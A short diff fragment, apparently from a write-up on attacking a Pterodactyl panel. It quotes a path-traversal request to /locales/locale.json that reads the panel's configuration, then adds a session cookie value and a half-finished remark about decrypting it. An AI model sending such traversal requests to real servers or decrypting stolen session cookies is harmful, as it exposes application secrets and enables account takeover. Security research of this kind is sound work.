@@ -338,4 +338,10 @@ GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=hashing HTTP/1.1
 ```
 
 
+```
+i know that this is cookie:
 
+pterodactyl_session=eyJpdiI6IjN6eUhaZndrTUtmVVM5d2xLMGdmNGc9PSIsInZhbHVlIjoidFpBalR4cndnYVBOb0Q3bUI4RlpzZmdvbyt5bzZkSmxpMDdmYjhWMWxULzRxM0N6Q24yNWdHeWlHSCtXNjNsNENSYkxQK0VEaThEZ3ZJa24za0RqaEVKT09PNkMrNy9NZzhKYmQvTU4xcC9CSDVLSVpSYXd2ZFlOUURIS1BHeG4iLCJtYWMiOiI2MjBlMGEwMGYyMTRhNjVlNzcwZGNiMWU4ZTRhOTZjZWY5OTQ3YWRjZjI5MmFmNjRjMDI2NjVkMWUyNzBjNTk4IiwidGFnIjoiIn0%3D;
+
+after decrypt it 
+```
